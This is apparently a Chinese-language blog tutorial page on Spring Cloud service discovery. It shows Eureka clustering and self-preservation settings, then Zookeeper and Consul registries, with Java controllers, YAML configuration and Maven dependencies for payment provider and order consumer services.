<h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><h5 id="服务提供者集群8001-8002"><a href="#服务提供者集群8001-8002" class="headerlink" title="服务提供者集群8001/8002"></a>服务提供者集群8001/8002</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line"><span class="comment">#    表示是否将自己注册进EurekaServer默认为true</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#    是否从EurekaServer抓取已有的注册信息,默认为true</span></span><br><span class="line"><span class="comment">#    单节点无所谓，集群必须设置为true才能配合Ribbon使用负载均衡</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">payment8002</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping(&quot;/create&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CommonResult <span class="title">createPayment</span><span class="params">(<span class="meta">@RequestBody</span> Payment payment)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = paymentService.create(payment);</span><br><span class="line">    log.info(<span class="string">&quot;*****插入结果:&quot;</span>+result);</span><br><span class="line">    <span class="keyword">if</span> (result&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">&quot;插入数据库成功,serverPort:&quot;</span>+serverPort,result);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">444</span>,<span class="string">&quot;插入数据库失败&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="服务消费者order80"><a href="#服务消费者order80" class="headerlink" title="服务消费者order80"></a>服务消费者order80</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public static final String PAYMENT_URL=&quot;http://localhost:8001&quot;;</span></span><br><span class="line"><span class="comment">//    微服务名称</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PAYMENT_URL=<span class="string">&quot;http://cloud-payment-service&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/consumer/payment/get/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">getPayment</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(PAYMENT_URL+<span class="string">&quot;/payment/get/&quot;</span>+id,CommonResult.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>@LoadBalanced</code>注解赋予<code>RestTemplate</code>负载均衡的能力</p>
<h3 id="actuator微服务信息完善"><a href="#actuator微服务信息完善" class="headerlink" title="actuator微服务信息完善"></a>actuator微服务信息完善</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="主机名称"><a href="#主机名称" class="headerlink" title="主机名称"></a>主机名称</h4><h5 id="服务名称修改"><a href="#服务名称修改" class="headerlink" title="服务名称修改"></a>服务名称修改</h5><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line"><span class="comment">#    表示是否将自己注册进EurekaServer默认为true</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#    是否从EurekaServer抓取已有的注册信息,默认为true</span></span><br><span class="line"><span class="comment">#    单节点无所谓，集群必须设置为true才能配合Ribbon使用负载均衡</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka</span></span><br><span class="line"><span class="comment">#      defaultZone: http://localhost:7001/eureka</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">payment8002</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210126111619308.png" alt="image-20210126111619308"></p>
<h5 id="健康检查"><a href="#健康检查" class="headerlink" title="健康检查"></a>健康检查</h5><p><img src="https://csn.damyoung.cn/image-20210126111703365.png" alt="image-20210126111703365"></p>
<h4 id="访问信息有ip显示"><a href="#访问信息有ip显示" class="headerlink" title="访问信息有ip显示"></a>访问信息有ip显示</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">instance:</span></span><br><span class="line">  <span class="attr">instance-id:</span> <span class="string">payment8001</span></span><br><span class="line">  <span class="attr">prefer-ip-address:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="服务发现Discovery"><a href="#服务发现Discovery" class="headerlink" title="服务发现Discovery"></a>服务发现Discovery</h3><p>对于注册进eureka的微服务，可以使用服务发现来获得该服务信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> DiscoveryClient discoveryClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/discovery&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">discovery</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List&lt;String&gt; services = discoveryClient.getServices();</span><br><span class="line">    <span class="keyword">for</span> (String service : services) &#123;</span><br><span class="line">        log.info(<span class="string">&quot;***element:&quot;</span>+service);</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;ServiceInstance&gt; instances = discoveryClient.getInstances(<span class="string">&quot;cloud-payment-service&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (ServiceInstance instance : instances) &#123;</span><br><span class="line">        log.info(instance.getServiceId()+<span class="string">&quot;\t&quot;</span>+instance.getHost()+<span class="string">&quot;\t&quot;</span>+instance.getPort()+<span class="string">&quot;\t&quot;</span>+instance.getUri());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.discoveryClient;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主启动类配置<code>@EnableDiscoveryClient</code></p>
<p><a href="http://localhost:8001/payment/discovery">http://localhost:8001/payment/discovery</a></p>
<p><img src="https://csn.damyoung.cn/image-20210126203428491.png" alt="image-20210126203428491"></p>
<h3 id="Eureka自我保护"><a href="#Eureka自我保护" class="headerlink" title="Eureka自我保护"></a>Eureka自我保护</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>保护模式主要用于一组客户端和Eureka Server之间存在网络分区场景下的保护，一旦进入保护模式</p>
<p>Eureka Server将会尝试保护其服务注册表中的信息，不再删除服务注册表中的数据，也就是不会注销任何微服务</p>
<p>在Eureka Server的首页看到以下这段提示，则说明Eureka进入保护模式</p>
<p><img src="https://csn.damyoung.cn/image-20210126204034184.png" alt="image-20210126204034184"></p>
<h4 id="失效原因"><a href="#失效原因" class="headerlink" title="失效原因"></a>失效原因</h4><p>某时刻某个微服务不可用了，Eureka不会立即清理，依旧会对该微服务的信息进行保存</p>
<p>属于CAP中AP分支</p>
<h5 id="自我保护"><a href="#自我保护" class="headerlink" title="自我保护"></a>自我保护</h5><p>为了防止 <code>Eureka Client</code> 可以正常运行，但与<code>Eureka Server</code>网络不通情况下，<code>Eureka Server</code>不会立即将<code>Eureka client</code>清除</p>
<h4 id="禁止自我保护"><a href="#禁止自我保护" class="headerlink" title="禁止自我保护"></a>禁止自我保护</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">server:</span></span><br><span class="line"><span class="comment">#    关闭自我保护机制，保证不可用服务被及时剔除</span></span><br><span class="line">    <span class="attr">enable-self-preservation:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">eviction-interval-timer-in-ms:</span> <span class="number">2000</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line"><span class="comment">#    Eureka客户端向服务端发送心跳的时间间隔,单位为秒(默认是30秒</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">1</span></span><br><span class="line"><span class="comment">#    Eureka服务端在收到最后一次心跳后等待时间上限,单位为秒(默认是90秒),超时将剔除服务</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h2><p>zookeeper是一个分布式协调工具，可以实现注册中心功能</p>
<p>关闭Linux服务器防火墙启动zookeeper服务器，zookeeper服务器取代Eureka服务器，zk作为服务注册中心</p>
<p>zookeeper是临时节点</p>
<h3 id="Zookeeper注册中心"><a href="#Zookeeper注册中心" class="headerlink" title="Zookeeper注册中心"></a>Zookeeper注册中心</h3><h4 id="linux下运行"><a href="#linux下运行" class="headerlink" title="linux下运行"></a>linux下运行</h4><p>打开zookeeperServer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/root/apache-zookeeper-<span class="number">3.6</span><span class="number">.2</span>-bin/bin/zkServer.sh start</span><br></pre></td></tr></table></figure>

<p>打开zookeeperClient，进入<code>/root/apache-zookeeper-3.6.2-bin/bin</code>目录下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">./zkCli.sh start</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210129101517305.png" alt="image-20210129101517305"></p>
<h4 id="验证zookeeperCli下目录"><a href="#验证zookeeperCli下目录" class="headerlink" title="验证zookeeperCli下目录"></a>验证zookeeperCli下目录</h4><blockquote>
<p>仅有[zookeeper]目录</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20210129101701257.png" alt="image-20210129101701257"></p>
<h3 id="服务提供者8004"><a href="#服务提供者8004" class="headerlink" title="服务提供者8004"></a>服务提供者8004</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- SpringBoot整合zookeeper客户端 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zookeeper-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--先排除自带的zookeeper3.5.3--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--添加zookeeper3.4.9版本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.6.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8004</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-payment</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper:</span></span><br><span class="line"><span class="comment">#      zookeeper服务端口</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:2181</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/payment/zk&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentzk</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;springCloud with zookeeper:&quot;</span>+serverPort+<span class="string">&quot;\t&quot;</span>+ UUID.randomUUID().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="主启动类"><a href="#主启动类" class="headerlink" title="主启动类"></a>主启动类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span> <span class="comment">//该注解用于向使用consul或者zookeeper作为注册中心时注册服务</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payment8004</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(Payment8004.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="验证是否已经注册进zookeeper"><a href="#验证是否已经注册进zookeeper" class="headerlink" title="验证是否已经注册进zookeeper"></a>验证是否已经注册进zookeeper</h3><ol>
<li>打开 localhost:8004/payment/payment/zk</li>
</ol>
<p><img src="https://csn.damyoung.cn/image-20210129101952982.png" alt="image-20210129101952982"></p>
<ol start="2">
<li><p>zookeeperCli</p>
<blockquote>
<p>可以看出 services已经注册进zookeeper中</p>
</blockquote>
</li>
</ol>
<p><img src="https://csn.damyoung.cn/image-20210129102103239.png" alt="image-20210129102103239"></p>
<ol start="3">
<li>转json工具 tool.lu/json</li>
</ol>
<p><img src="https://csn.damyoung.cn/image-20210129102218869.png" alt="image-20210129102218869"></p>
<h3 id="服务消费者80"><a href="#服务消费者80" class="headerlink" title="服务消费者80"></a>服务消费者80</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- SpringBoot整合zookeeper客户端 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zookeeper-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--先排除自带的zookeeper--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--添加zookeeper3.4.9版本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-consumer-order</span></span><br><span class="line"><span class="comment">#  注册到zookeeper地址</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper:</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="number">42.192</span><span class="number">.130</span><span class="number">.130</span><span class="string">:2181</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderZKMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderZKMain80.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span> <span class="comment">//使得zkorder80具有负载均衡能力</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderZkController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String INVOKE_URL=<span class="string">&quot;http://cloud-provider-payment&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/consumer/payment/zk&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String result = restTemplate.getForObject(INVOKE_URL + <span class="string">&quot;/payment/zk&quot;</span>, String.class);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p><img src="https://csn.damyoung.cn/image-20210129115521784.png" alt="image-20210129115521784"></p>
<p><img src="https://csn.damyoung.cn/image-20210129115534524.png" alt="image-20210129115534524"></p>
<h2 id="Consul"><a href="#Consul" class="headerlink" title="Consul"></a>Consul</h2><blockquote>
<p>官网<a href="https://consul.io/intro/index.html">https://consul.io/intro/index.html</a></p>
<p>下载<a href="https://consul.io/downloads.html">https://consul.io/downloads.html</a></p>
<p>中文文档：<a href="https://springcloud.cc/spring-cloud-consul.html">https://springcloud.cc/spring-cloud-consul.html</a></p>
</blockquote>
<p>开源的分布式服务发现和配置管理系统，Go语言编写</p>
<p>提供了微服务系统中的<strong>服务治理、配置中心、控制总线</strong>等功能，这些功能中的每一个都可以根据需要单独使用，也可以一起使用以构建全方位的服务网格，Consul提供了一种完整的服务网格解决方案</p>
<p>具有很多优点，包括：基于raft协议，比较简洁；支持健康检查，同时支持Http和DNS协议，支持跨数据中心的WLAN集群，提供图形界面，跨平台，支持Linux,Mac，Windows</p>
<h3 id="安装并运行consul"><a href="#安装并运行consul" class="headerlink" title="安装并运行consul"></a>安装并运行consul</h3><ol>
<li><p>下载运行consul.exe(在路径上cmd)</p>
</li>
<li><p>使用开发模式启动</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">consul agent -dev <span class="comment">//开发者模式启动</span></span><br><span class="line">consul --version <span class="comment">//查看版本号</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>打开consul Web服务页面 <a href="http://localhost:8500/">http://localhost:8500</a></li>
</ol>
<h3 id="服务提供者8006"><a href="#服务提供者8006" class="headerlink" title="服务提供者8006"></a>服务提供者8006</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud consul-server --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-consul-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentConsulController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverPort;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/payment/consul&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentConsul</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;springCloud with consul:&quot;</span>+serverPort+<span class="string">&quot;\t&quot;</span>+ UUID.randomUUID().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payment8006</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(Payment8006.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">###consul服务端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8006</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">consul-provider-payment</span></span><br><span class="line">  <span class="comment">####consul注册中心地址</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">consul:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8500</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment">#hostname: 127.0.0.1</span></span><br><span class="line">        <span class="attr">service-name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20210129155916581.png" alt="image-20210129155916581"></p>
<p><img src="C:%5CUsers%5Cadmin%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210129160006140.png" alt="image-20210129160006140"></p>
<h3 id="服务消费者80-1"><a href="#服务消费者80-1" class="headerlink" title="服务消费者80"></a>服务消费者80</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud consul-server --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-consul-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

